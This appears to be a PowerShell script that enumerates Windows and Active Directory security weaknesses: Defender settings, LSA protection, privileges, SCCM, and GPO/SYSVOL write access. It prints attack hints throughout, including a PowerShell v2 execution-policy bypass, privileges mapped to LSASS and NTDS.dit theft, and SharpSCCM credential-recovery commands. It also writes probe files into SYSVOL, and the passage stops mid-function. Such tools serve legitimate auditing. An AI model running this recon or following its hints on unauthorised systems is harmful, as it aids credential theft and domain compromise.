$DATE = Get-Date -Format "yyyyMMdd_HHmm"
$USER = $env:USERNAME
$OUT = "$env:USERPROFILE\Downloads\fkpc-$DATE-$USER"
New-Item -ItemType Directory -Path $OUT -Force | Out-Null

# Start logging
$logFile = "$OUT\fkpc-run.log"
Start-Transcript -Path $logFile -Append -IncludeInvocationHeader

function Banner {
    Write-Host ""
    Write-Host "       _____         _____         _____         _____         _____" -ForegroundColor DarkGray
    Write-Host "     .'     '.     .'     '.     .'     '.     .'     '.     .'     '." -ForegroundColor DarkGray
    Write-Host "    /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \" -ForegroundColor DarkGray
    Write-Host "   |           | |           | |           | |           | |           |" -ForegroundColor DarkGray
    Write-Host "   |  \     /  | |  \     /  | |  \     /  | |  \     /  | |  \     /  |" -ForegroundColor DarkGray
    Write-Host "    \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /" -ForegroundColor DarkGray
    Write-Host "     '._____.'     '._____.'     '._____.'     '._____.'     '._____.' " -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "    real hackers listen to inside darknet" -ForegroundColor DarkGray
    Write-Host ""
}

function Run {
    param($Label, $Block, $File)
    try {
        $result = & $Block
        $result | Out-File "$OUT\$File" -Encoding utf8
        Write-Host "[ OK ]   $Label -> $File" -ForegroundColor Green
    } catch {
        Write-Host "[ OK ]   $Label failed: $_" -ForegroundColor DarkGray
    }
}

function IsAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

Banner

Write-Host "[*]   Device: $($env:COMPUTERNAME)" -ForegroundColor DarkGray
Write-Host "[*]   User: $($env:USERNAME)" -ForegroundColor DarkGray
Write-Host ""

# Internet Access
$onlineToolsAvailable = $false
try {
    $testGH = Invoke-WebRequest -Uri "https://github.com" -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
    if ($testGH.Content -match "Firewall Authentication|You must authenticate|captive") {
        Write-Host "[ -- ]   Captive Portal detected - online tools will be skipped" -ForegroundColor DarkYellow
    } else {
        try {
            $testAssets = Invoke-WebRequest -Uri "https://release-assets.githubusercontent.com" -UseBasicParsing -TimeoutSec 5
            $onlineToolsAvailable = $true
        } catch [System.Net.WebException] {
            if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 404) {
                $onlineToolsAvailable = $true
            } else {
                Write-Host "[ -- ]   GitHub release assets blocked - online tools will be skipped" -ForegroundColor DarkGray
            }
        }
    }
} catch {
    Write-Host "[ -- ]   GitHub not reachable - online tools will be skipped" -ForegroundColor DarkGray
}

$isDomainJoined = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
if ($isDomainJoined) {
    Write-Host "[ OK ]   Domain-joined: $env:USERDNSDOMAIN" -ForegroundColor Green
} else {
    Write-Host "[ -- ]   Not domain-joined - AD-dependent checks will be skipped" -ForegroundColor DarkGray
}

$isAdmin = IsAdmin
if ($isAdmin) {
    Write-Host "[ OK ]   Running as administrator" -ForegroundColor Red
} else {
    Write-Host "[ OK ]   Not running as administrator" -ForegroundColor Green
}

# PowerShell downgrade
$actualVersion = powershell -version 2 -command "[int]`$PSVersionTable.PSVersion.Major" 2>&1
if (($actualVersion | ForEach-Object { "$_" }) -join "" -match "^2") {
    Write-Host "[P005]   PowerShell v2 downgrade possible" -ForegroundColor DarkRed
    Write-Host "          - powershell -version 2 -ExecutionPolicy Bypass -File fkpc.ps1" -ForegroundColor DarkGray
} else {
    Write-Host "[ OK ]   PowerShell downgrade not possible (PSv2 blocked)" -ForegroundColor Green
}

# Language Mode Check
$languageMode = $ExecutionContext.SessionState.LanguageMode
if ($languageMode -eq "FullLanguage") {
    Write-Host "[P015]   PowerShell language mode: FullLanguage" -ForegroundColor DarkRed
} elseif ($languageMode -eq "ConstrainedLanguage") {
    Write-Host "[ OK ]   PowerShell language mode: Constrained Language Mode" -ForegroundColor Green
} else {
    Write-Host "[ -- ]   PowerShell language mode: $languageMode" -ForegroundColor DarkYellow
}

Write-Host ""

# Privs whoami /all
$privMap = @{
    "SeDebugPrivilege"           = "Read LSASS / inject into any process"
    "SeImpersonatePrivilege"     = "Token impersonation -> PrintSpoofer/JuicyPotato"
    "SeAssignPrimaryPrivilege"   = "Assign primary token -> privilege escalation"
    "SeTcbPrivilege"             = "Act as OS -> create tokens"
    "SeBackupPrivilege"          = "Read any file ignoring ACLs -> NTDS.dit"
    "SeRestorePrivilege"         = "Write any file ignoring ACLs"
    "SeCreateTokenPrivilege"     = "Create arbitrary tokens"
    "SeLoadDriverPrivilege"      = "Load malicious kernel driver"
    "SeTakeOwnershipPrivilege"   = "Take ownership of any object"
    "SeRelabelPrivilege"         = "Modify integrity levels"
}
$whoamiOut = whoami /all
$whoamiOut | Out-File "$OUT\whoami_all.txt" -Encoding utf8
Write-Host "[ OK ]   Privileges (whoami /all) -> whoami_all.txt" -ForegroundColor Green
foreach ($priv in $privMap.Keys) {
    if ($whoamiOut -match $priv) {
        Write-Host "          - [P110]   $priv`: $($privMap[$priv])" -ForegroundColor DarkRed
    }
}

Run "System Info" { systeminfo } "systeminfo.txt"
Write-Host "          - https://github.com/bitsadmin/wesng for common vulns: wes.py systeminfo.txt " -ForegroundColor DarkGray

Write-Host ""

# AMRunningMode Status
$DefenderPreferences = Get-MpPreference -ErrorAction SilentlyContinue
$DefenderStatus = Get-MpComputerStatus
$AMRunningMode = $DefenderStatus.AMRunningMode
if ($AMRunningMode -eq "Normal" -or $AMRunningMode -eq "EDR Blocked") {
    Write-Host "[ OK ]   Microsoft Defender is running in Active Mode" -ForegroundColor Green
} elseif ($AMRunningMode -eq "Passive" -or $AMRunningMode -eq "SxS Passive Mode") {
    Write-Host "[P020]   Microsoft Defender is running in $AMRunningMode" -ForegroundColor DarkRed
} else {
    Write-Host "[ ?? ]   Microsoft Defender is running in $AMRunningMode" -ForegroundColor DarkYellow
}

# Real-Time Protection
try {
    $realTimeEnabled = $defenderStatus.RealTimeProtectionEnabled
    $monitoringDisabled = $DefenderPreferences.DisableRealtimeMonitoring
    if ($realTimeEnabled -eq $true -or $monitoringDisabled -eq $false) {
        Write-Host "          - Real Time Protection is enabled" -ForegroundColor Green
    } else {
        Write-Host "          - [P025] Real Time Protection is disabled" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "          - Real-Time Protection status is unknown" -ForegroundColor DarkYellow
}

# MDE Sensor
try {
    $MDEservice = Get-Service -Name "Sense" -ErrorAction Stop
    if ($MDEservice.Status -eq "Running") {
        Write-Host "          - Microsoft Defender for Endpoint Sensor is enabled" -ForegroundColor Green
    } else {
        Write-Host "          - [P030] Microsoft Defender for Endpoint Sensor is disabled" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "          - Microsoft Defender for Endpoint Sensor is unknown" -ForegroundColor DarkYellow
}

# Network Protection
try {
    $NetworkProtectionValue = (Get-MpPreference -ErrorAction SilentlyContinue).EnableNetworkProtection
    if ($NetworkProtectionValue -eq 1) {
        Write-Host "          - Microsoft Defender for Endpoint Network Protection is enabled" -ForegroundColor Green
    } elseif ($NetworkProtectionValue -eq 0) {
        Write-Host "          - [P035] Microsoft Defender for Endpoint Network Protection is disabled" -ForegroundColor DarkRed
    } elseif ($NetworkProtectionValue -eq 2) {
        Write-Host "          - Microsoft Defender for Endpoint Network Protection is in audit mode" -ForegroundColor DarkYellow
    }
} catch {
    Write-Host "          - Microsoft Defender for Endpoint Network Protection can not be queried" -ForegroundColor DarkYellow
}

# Tamper Protection
$TamperProtectionStatus = $DefenderStatus.IsTamperProtected
$TamperProtectionManage = $DefenderStatus.TamperProtectionSource

if ($TamperProtectionStatus -eq $true) {
    Write-Host "          - Tamper Protection is enabled" -ForegroundColor Green
} else {
    Write-Host "          - [P040] Tamper Protection is disabled" -ForegroundColor DarkRed
}

# LSA Protection (RunAsPPL)
try {
    $runAsPPL = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction Stop).RunAsPPL
    if ($runAsPPL -ge 1) {
        Write-Host "          - LSA Protection (RunAsPPL) is enabled" -ForegroundColor Green
    } else {
        Write-Host "          - [P045] LSA Protection (RunAsPPL) is disabled - LSASS dump possible without driver" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "          - [P045] LSA Protection (RunAsPPL) not configured - LSASS dump possible without driver" -ForegroundColor DarkRed
}

# Credential Guard
try {
    $cgEnabled = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity
    $cgScenario = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\CredentialGuard" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled
    if ($cgScenario -eq 1) {
        Write-Host "          - Credential Guard is enabled" -ForegroundColor Green
    } elseif ($cgEnabled -eq 1) {
        Write-Host "          - Credential Guard: VBS enabled but scenario not confirmed" -ForegroundColor DarkYellow
    } else {
        Write-Host "          - [P050] Credential Guard is not enabled - Kadse likely works" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "          - Credential Guard status could not be determined" -ForegroundColor DarkYellow
}

# Smart App Control
try {
    $sacState = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -ErrorAction Stop).VerifiedAndReputablePolicyState
    if ($sacState -eq 1) {
        Write-Host "          - Smart App Control is enabled" -ForegroundColor Green
    } elseif ($sacState -eq 2) {
        Write-Host "          - [P055] Smart App Control is in evaluation mode, not blocking" -ForegroundColor DarkRed
    } else {
        Write-Host "          - [P055] Smart App Control is disabled" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "          - [P055] Smart App Control is not configured" -ForegroundColor DarkRed
}

# PUA Protection
try {
    $puaState = (Get-MpPreference -ErrorAction SilentlyContinue).PUAProtection
    if ($puaState -eq 1) {
        Write-Host "          - Potentially Unwanted Applications (PUA) Protection is enabled" -ForegroundColor Green
    } elseif ($puaState -eq 2) {
        Write-Host "          - [P060] Potentially Unwanted Applications (PUA) Protection is just auditing, not blocking" -ForegroundColor DarkRed
    } else {
        Write-Host "          - [P060] Potentially Unwanted Applications (PUA) Protection is disabled" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "          - PUA Protection status could not be determined" -ForegroundColor DarkYellow
}

# Behavior Monitoring
if (-not $DefenderPreferences.DisableBehaviorMonitoring) {
    Write-Host "          - Behavior Monitoring is enabled" -ForegroundColor Green
} else {
    Write-Host "          - [P065] Behavior Monitoring is disabled" -ForegroundColor DarkRed
}

# Memory Integrity
try {
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") {
        $hvciStatus = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity").Enabled
        if ($hvciStatus -eq 1) {
            Write-Host "          - Memory Integrity is enabled" -ForegroundColor Green
        } else {
            Write-Host "          - [P070] Memory Integrity is disabled" -ForegroundColor DarkRed
        }
    } else {
        Write-Host "          - Memory Integrity requires more permissions to view" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "          - Memory Integrity is unknown" -ForegroundColor DarkYellow
}

# Exclusions
if ($isAdmin) {
    $exclusionExtensions = $DefenderPreferences.ExclusionExtension
    $exclusionPaths = $DefenderPreferences.ExclusionPath
    $exclusionProcesses = $DefenderPreferences.ExclusionProcess
    
    $hasAnyExclusions = ($exclusionExtensions -and $exclusionExtensions.Count -gt 0) -or `
                        ($exclusionPaths -and $exclusionPaths.Count -gt 0) -or `
                        ($exclusionProcesses -and $exclusionProcesses.Count -gt 0)
    
    if ($hasAnyExclusions) {
        Write-Host "          - [P075] Defender Exclusions found" -ForegroundColor DarkRed
        if ($exclusionExtensions -and $exclusionExtensions.Count -gt 0) {
            Write-Host "                   - Extension exclusions found" -ForegroundColor DarkRed
        }
        if ($exclusionPaths -and $exclusionPaths.Count -gt 0) {
            Write-Host "                  - Path exclusions found" -ForegroundColor DarkRed
        }
        if ($exclusionProcesses -and $exclusionProcesses.Count -gt 0) {
            Write-Host "                  - Process exclusions found" -ForegroundColor DarkRed
        }
    } else {
        Write-Host "          - No exclusions found" -ForegroundColor Green
    }

# Exclusions through event ID    
} else {
    $LogName = "Microsoft-Windows-Windows Defender/Operational"
    $EventID = 5007
    $foundExclusions = @()
    try {
        $ExclusionEvents = Get-WinEvent -LogName $LogName -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq $EventID -and $_.Message -match "Exclusions" } | Select-Object -First 10
        foreach ($Event in $ExclusionEvents) {
            if ($Event.Message -match "\\Exclusions\\Paths\\") {
                $foundExclusions += $Event.Message
            }
        }
        if ($foundExclusions.Count -gt 0) {
            $foundExclusions | Out-File "$OUT\defender_exclusions.txt" -Encoding utf8
            Write-Host "          - [P075] Exclusions detected via event logs -> defender_exclusions.txt" -ForegroundColor DarkRed
        } else {
            Write-Host "          - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
        }
    } catch {
        Write-Host "          - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
    }
}

# ASR Rules
$asrRulesDefinitions = @{
    "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550" = "Block executable content from email client and webmail"
    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" = "Block all Office applications from creating child processes"
    "3B576869-A4EC-4529-8536-B80A7769E899" = "Block Office applications from creating executable content"
    "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84" = "Block Office apps from injecting code into processes"
    "D3E037E1-3EB8-44C8-A917-57927947596D" = "Block JS or VBS from launching downloaded executable content"
    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" = "Block execution of potentially obfuscated scripts"
    "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" = "Block Win32 API calls from Office macros"
    "01443614-CD74-433A-B99E-2ECDC07BFC25" = "Block executable files unless prevalence or age criteria met"
    "C1DB55AB-C21A-4637-BB3F-A12568109D35" = "Use advanced protection against ransomware"
    "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2" = "Block credential stealing from lsass.exe"
    "D1E49AAC-8F56-4280-B9BA-993A6D77406C" = "Block process creations from PSExec and WMI commands"
    "B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4" = "Block untrusted and unsigned processes from USB"
    "26190899-1602-49E8-8B27-EB1D0A1CE869" = "Block Office communication application from creating child processes"
    "7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C" = "Block Adobe Reader from creating child processes"
    "E6DB77E5-3DF2-4CF1-B95A-636979351E5B" = "Block persistence through WMI event subscription"
    "56A863A9-875E-4185-98A7-B882C64B5CE5" = "Block abuse of exploited vulnerable signed drivers"
    "33DDEDF1-C6E0-47CB-833E-DE6133960387" = "Block rebooting machine in Safe Mode"
    "C0033C00-D16D-4114-A5A0-DC9B3A7D2CEB" = "Block use of copied or impersonated system tools"
    "A8F5898E-1DC8-49A9-9878-85004B8A61E6" = "Block Webshell creation for Servers"
}
if (IsAdmin) {
    $asrStatuses = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
    $asrRuleGuids = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
    $disabledCount = 0
    foreach ($guid in $asrRuleGuids) {
        $index = [array]::IndexOf($asrRuleGuids, $guid)
        if ($asrStatuses[$index] -ne 1) {
            $disabledCount++
        }
    }
    if ($disabledCount -gt 0) {
        Write-Host "          - [P080] $disabledCount ASR rule(s) not enabled" -ForegroundColor DarkRed
        foreach ($guid in $asrRuleGuids) {
            $index = [array]::IndexOf($asrRuleGuids, $guid)
            if ($asrStatuses[$index] -ne 1) {
                $ruleName = $asrRulesDefinitions[$guid]
                if ($ruleName) {
                    Write-Host "                  - $ruleName" -ForegroundColor DarkGray
                }
            }
        }
    } else {
        Write-Host "          - All ASR rules are enabled" -ForegroundColor Green
    }
} else {
    Write-Host "          - ASR rule enumeration requires more privs" -ForegroundColor DarkGray
}

Write-Host ""

# BitLocker
$bitlockerStatus = (New-Object -ComObject Shell.Application).NameSpace('C:').Self.ExtendedProperty('System.Volume.BitLockerProtection')
if ($bitlockerStatus -eq 1) {
    Write-Host "[ OK ]   C: drive is BitLocker encrypted" -ForegroundColor Green
} elseif ($bitlockerStatus -eq 2) {
    Write-Host "[P085]   C: drive is not BitLocker encrypted" -ForegroundColor DarkRed
} else {
    Write-Host "[ -- ]   C: drive BitLocker encryption is unknown" -ForegroundColor DarkYellow
}

# WDAC
try {
    $cipolicies = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop
    $codeIntegrityStatus = $cipolicies.CodeIntegrityPolicyEnforcementStatus
    $userModeStatus = $cipolicies.UsermodeCodeIntegrityPolicyEnforcementStatus

    $policyDir = "$env:windir\System32\CodeIntegrity\CiPolicies\Active"
    $policyCount = 0
    if (Test-Path $policyDir) {
        $activePolicies = Get-ChildItem -Path $policyDir -Filter "*.cip" -ErrorAction SilentlyContinue
        $policyCount = $activePolicies.Count
    }

    if ($policyCount -gt 0) {
        Write-Host "[ OK ]   WDAC Active Policies: $policyCount policies deployed" -ForegroundColor Green
    } else {
        Write-Host "[P090]   WDAC Active Policies: No policies deployed" -ForegroundColor DarkRed
    }

    switch ($codeIntegrityStatus) {
        2 { Write-Host "          - Kernel Mode Code Integrity: Enforced" -ForegroundColor Green }
        1 { Write-Host "          - [P091] Kernel Mode Code Integrity: Audit Mode only, not blocking" -ForegroundColor DarkRed }
        0 { Write-Host "          - [P092] Kernel Mode Code Integrity: Off" -ForegroundColor DarkRed }
        Default { Write-Host "          - [ -- ] Kernel Mode Code Integrity: Unknown ($codeIntegrityStatus)" -ForegroundColor DarkYellow }
    }

    switch ($userModeStatus) {
        2 { Write-Host "          - User Mode Code Integrity: Enforced" -ForegroundColor Green }
        1 { Write-Host "          - [P093] User Mode Code Integrity: Audit Mode only, not blocking" -ForegroundColor DarkRed }
        0 { Write-Host "          - [P094] User Mode Code Integrity: Off" -ForegroundColor DarkRed }
        Default { Write-Host "          - [ -- ] User Mode Code Integrity: Unknown ($userModeStatus)" -ForegroundColor DarkYellow }
    }

} catch {
    Write-Host "          - WDAC: Unable to query" -ForegroundColor DarkYellow
}

# AppLocker
try {
    $applockerService = Get-Service -Name "AppIDSvc" -ErrorAction Stop
    if ($applockerService.Status -eq "Running") {
        Write-Host "[ OK ]   AppLocker Service (AppIDSvc) is running" -ForegroundColor Green
    } else {
        Write-Host "[P095]   AppLocker Service (AppIDSvc) is not running" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "[P095]   AppLocker Service (AppIDSvc) was not found" -ForegroundColor DarkRed
}

$applockerRegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
$applockerConfigured = $false
$applockerCollections = @("Exe", "Msi", "Script", "Dll", "Appx")
foreach ($collection in $applockerCollections) {
    $collPath = "$applockerRegPath\$collection"
    if (Test-Path $collPath) {
        $rules = Get-ChildItem -Path $collPath -ErrorAction SilentlyContinue
        if ($rules.Count -gt 0) {
            $applockerConfigured = $true
            Write-Host "          - AppLocker $collection Rules: $($rules.Count) rule(s) configured" -ForegroundColor DarkGreen
        }
    }
}
if (-not $applockerConfigured) {
    Write-Host "          - [P096] AppLocker: No baselines or rules configured, all executables are allowed" -ForegroundColor DarkRed
}

# Edge SmartScreen
$edgeSSvalue = $null
$policyPaths = @(
    "HKLM:\SOFTWARE\Policies\Microsoft\Edge",
    "HKCU:\SOFTWARE\Policies\Microsoft\Edge"
)
foreach ($path in $policyPaths) {
    if (Test-Path $path) {
        try {
            $edgeSSvalue = Get-ItemPropertyValue -Path $path -Name "SmartScreenEnabled" -ErrorAction Stop
            break
        } catch {}
    }
}
if ($edgeSSvalue -eq 0) {
    Write-Host "[P105]   Microsoft Edge SmartScreen is disabled" -ForegroundColor DarkRed
} else {
    Write-Host "[ OK ]   Microsoft Edge SmartScreen is enabled" -ForegroundColor Green
}

Write-Host ""

# SCCM/SCOM Enumeration
try {
    $smContainer = Get-ADObject -Filter {Name -eq "System Management"} -SearchBase $([ADSI]"LDAP://RootDSE").defaultNamingContext -ErrorAction Stop
    if ($smContainer) {
        Write-Host "[P115]   System Center infrastructure detected (SCCM/SCOM)" -ForegroundColor DarkRed
        Write-Host "          - SCCM: Use SharpSCCM - https://github.com/Mayyhem/SharpSCCM" -ForegroundColor DarkGray
        Write-Host "          - SCOM: Use SharpSCOM - https://github.com/breakfix/SharpSCOM" -ForegroundColor DarkGray

        # Find site servers via GenericAll on System Management container (same technique as SharpSCCM)
        try {
            $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=System Management,CN=System,$($([ADSI]"LDAP://RootDSE").defaultNamingContext)")
            $acl = $entry.ObjectSecurity
            $siteServers = @()
            foreach ($ace in $acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {
                if ($ace.ActiveDirectoryRights -eq "GenericAll") {
                    try {
                        $account = $ace.IdentityReference.Translate([System.Security.Principal.NTAccount]).Value
                        if ($account -match "\$$") { $siteServers += $account }
                    } catch { }
                }
            }
            if ($siteServers.Count -gt 0) {
                Write-Host "[P116]   Likely SCCM site server(s) found (GenericAll on System Management)" -ForegroundColor DarkRed
                foreach ($s in $siteServers) { Write-Host "          - $s" -ForegroundColor DarkRed }
                Write-Host "          - SharpSCCM.exe get site-push-settings -sms $($siteServers[0] -replace '\$','')" -ForegroundColor DarkGray
            }
        } catch { }

        # Check if SCCM client is installed locally (NAA creds accessible)
        try {
            $mp = (Get-WmiObject -Namespace "root\ccm" -Class "SMS_Authority" -ErrorAction Stop | Select-Object -First 1).CurrentManagementPoint
            if ($mp) {
                Write-Host "[P117]   SCCM client installed locally, management point: $mp" -ForegroundColor DarkRed
                Write-Host "          - NAA credentials may be recoverable: SharpSCCM.exe local credentials" -ForegroundColor DarkGray
            }
        } catch { }
    }
} catch {
    Write-Host "[ OK ]   No System Center (SCCM/SCOM) infrastructure detected" -ForegroundColor Green
}

# GPO ACL Check
if (-not $isDomainJoined) {
    Write-Host "[ -- ]   GPO ACL check skipped (not domain-joined)" -ForegroundColor DarkGray
} else {
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $DN = "DC=" + ($domain.Name -replace "\.", ",DC=")
        $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Policies,CN=System,$DN")
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($entry)
        $searcher.Filter = "(objectClass=groupPolicyContainer)"
        $searcher.PropertiesToLoad.AddRange(@("displayName", "cn"))
        $searcher.SearchScope = "OneLevel"
        $searcher.PageSize = 1000
        $results = $searcher.FindAll()
        $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $currentSids = @($identity.User.Value) + @($identity.Groups | ForEach-Object { $_.Value })
        $writeMask = [System.DirectoryServices.ActiveDirectoryRights]"WriteProperty, WriteDacl, WriteOwner, CreateChild, DeleteChild, Delete, DeleteTree"
        $gpoFindings = @()
        $gpoReviews = @()

        foreach ($result in $results) {
            $gpoName = if ($result.Properties["displayName"].Count -gt 0) { $result.Properties["displayName"][0] } else { $result.Properties["cn"][0] }
            $acl = $result.GetDirectoryEntry().ObjectSecurity
            $aces = $acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])

            foreach ($ace in $aces) {
                if ($ace.AccessControlType -ne "Allow") { continue }
                if (($ace.ActiveDirectoryRights -band $writeMask) -eq 0) { continue }
                $sid = $ace.IdentityReference.Value
                $isDefaultAdmin = $sid -match "^S-1-5-18$|^S-1-5-32-544$|^S-1-3-0$|-512$|-518$|-519$|-520$"
                if ($isDefaultAdmin) { continue }
                try { $trustee = $ace.IdentityReference.Translate([System.Security.Principal.NTAccount]).Value } catch { $trustee = $sid }
                $record = [PSCustomObject]@{
                    GPO         = $gpoName
                    Trustee     = $trustee
                    SID         = $sid
                    Rights      = $ace.ActiveDirectoryRights
                    IsInherited = $ace.IsInherited
                }
                if ($currentSids -contains $sid) { $gpoFindings += $record } else { $gpoReviews += $record }
            }
        }

        if ($gpoFindings.Count -gt 0) {
            $affectedGpos = @($gpoFindings.GPO | Sort-Object -Unique).Count
            Write-Host "[P120]   Current user has write permissions on $affectedGpos GPO(s)" -ForegroundColor DarkRed
            foreach ($f in $gpoFindings) {
                Write-Host "          - '$($f.GPO)' via $($f.Trustee) ($($f.Rights))" -ForegroundColor DarkRed
            }
            $gpoFindings | Sort-Object GPO, Trustee | Out-File "$OUT\gpo_current_user_write_permissions.txt" -Encoding utf8
        } else {
            Write-Host "[ OK ]   Current user has no GPO write permissions" -ForegroundColor Green
        }

        if ($gpoReviews.Count -gt 0) {
            $reviewGpos = @($gpoReviews.GPO | Sort-Object -Unique).Count
            Write-Host "[R120]   $($gpoReviews.Count) delegated write permission(s) on $reviewGpos GPO(s) require review" -ForegroundColor DarkYellow
            foreach ($f in $gpoReviews) {
                Write-Host "          - '$($f.GPO)' - $($f.Trustee) ($($f.Rights))" -ForegroundColor DarkGray
            }
            $gpoReviews | Sort-Object GPO, Trustee | Out-File "$OUT\gpo_delegated_write_permissions.txt" -Encoding utf8
        } else {
            Write-Host "          - No non-default GPO delegations found" -ForegroundColor DarkGray
        }
    } catch {
        Write-Host "[ -- ]   GPO ACL check failed: $_" -ForegroundColor DarkYellow
    }
}

# SYSVOL File ACL Check
try {
    $SYSVOLPath = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
    $sysvolFindings = @()
    if (Test-Path $SYSVOLPath -ErrorAction SilentlyContinue) {
        $folders = Get-ChildItem -Path $SYSVOLPath -Directory -ErrorAction SilentlyContinue
        foreach ($folder in $folders) {
            $testFile = "$($folder.FullName)\fkpc_writetest_$(Get-Random)"
            try {
                [System.IO.File]::OpenWrite($testFile).Close()
                Remove-Item $testFile -ErrorAction SilentlyContinue
                $sysvolFindings += $folder.Name
            } catch {}
        }
        if ($sysvolFindings.Count -gt 0) {
            Write-Host "[P125]   $($sysvolFindings.Count) SYSVOL GPO folder(s) writable as current user" -ForegroundColor DarkRed
            $sysvolFindings | ForEach-Object { Write-Host "          - $_" -ForegroundColor DarkRed }
        } else {
            Write-Host "[ OK ]   No writable SYSVOL GPO folders found" -ForegroundColor Green
        }
    } else {
        Write-Host "[ -- ]   SYSVOL path not accessible" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "[ -- ]   SYSVOL check failed: $_" -ForegroundColor DarkYellow
}

# Tombstone deleted AD objects
try {
    if (Get-Module -ListAvailable -Name ActiveDirectory -ErrorAction SilentlyContinue) {
        $Deleted = Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects `
            -Properties Name, ObjectClass, whenChanged, LastKnownParent `
            | Where-Object { $_.ObjectClass -in @("user","computer","group") }
        if ($Deleted) {
            $Count = ($Deleted | Measure-Object).Count
            $Deleted | Select-Object Name, ObjectClass, whenChanged, LastKnownParent | Out-File "$OUT\tombstone.txt" -Encoding utf8
            Write-Host "[P130]   $Count deleted object(s) in tombstone -> tombstone.txt" -ForegroundColor DarkRed
            $Interesting = $Deleted | Where-Object { $_.Name -match "svc|admin|backup|sql|service|mgmt" }
            if ($Interesting) {
                $Interesting | ForEach-Object { Write-Host "             - $($_.Name) [$($_.ObjectClass)]" -ForegroundColor DarkGray }
            }
        } else {
            Write-Host "[ OK ]   No deleted objects in tombstone" -ForegroundColor Green
        }
    } else {
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $DN = "DC=" + ($Domain.Name -replace "\.", ",DC=")
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Deleted Objects,$DN")
        $Searcher.Filter = "(isDeleted=TRUE)"
        $Searcher.SearchScope = "OneLevel"
        $Searcher.Tombstone = $true
        $Searcher.PropertiesToLoad.AddRange(@("name","objectclass","whenchanged"))
        $Results = $Searcher.FindAll()
        if ($Results.Count -gt 0) {
            $Results | ForEach-Object { "$($_.Properties['name']) [$($_.Properties['objectclass'][-1])]" } | Out-File "$OUT\tombstone.txt" -Encoding utf8
            Write-Host "[P130]   $($Results.Count) deleted object(s) in tombstone -> tombstone.txt" -ForegroundColor DarkRed
        } else {
            Write-Host "[ OK ]   No deleted objects in tombstone" -ForegroundColor Green
        }
    }
} catch {
    Write-Host "[ -- ]   Tombstone check failed" -ForegroundColor DarkGray
}

# Reanimate-Tombstones ACL Check
try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $DN = "DC=" + ($domain.Name -replace "\.", ",DC=")
    $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DN")
    $acl = $entry.ObjectSecurity
    $reanimateGuid = [System.Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
    $dangerousTrustees = @()
    foreach ($ace in $acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {
        if ($ace.ObjectType -eq $reanimateGuid) {
            try {
                $account = $ace.IdentityReference.Translate([System.Security.Principal.NTAccount]).Value
                if ($account -notmatch "Domain Admins|Enterprise Admins|Administrators|SYSTEM") {
                    $dangerousTrustees += $account
                }
            } catch { $dangerousTrustees += $ace.IdentityReference.Value }
        }
    }
